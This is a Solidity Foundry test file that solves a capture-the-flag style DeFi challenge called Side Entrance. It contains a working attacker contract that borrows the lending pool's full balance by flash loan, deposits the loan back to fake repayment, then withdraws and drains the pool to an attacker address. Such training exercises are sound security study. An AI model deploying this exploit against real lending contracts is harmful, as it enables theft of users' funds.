// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract ETHFlashLoanStrategist {
    
    SideEntranceLenderPool public lendingPool;
    address payable public beneficiary;

    constructor(address poolAddress) {
        lendingPool = SideEntranceLenderPool(poolAddress);
    }

    function initiateFlashLoan(address payable recipient) external {
        uint256 availableFunds = address(lendingPool).balance;
        beneficiary = recipient;
        lendingPool.flashLoan(availableFunds);
        completeWithdrawal();
    }

    function execute() external payable {
        lendingPool.deposit{value: msg.value}();
    }

    function completeWithdrawal() private {
        lendingPool.withdraw();
        sendProfits();
    }

    function sendProfits() private {
        beneficiary.transfer(address(this).balance);
    }

    receive() external payable {}

}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        ETHFlashLoanStrategist strategist = new ETHFlashLoanStrategist(address(sideEntranceLenderPool));
    
        console.log("Deployed ETHFlashLoanStrategist, starting the strategic exploit...");

        vm.startPrank(attacker);

        console.log("Prank started, initiating flash loan...");

        strategist.initiateFlashLoan(attacker);

        console.log("Flash loan initiated and funds withdrawn to attacker...");

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
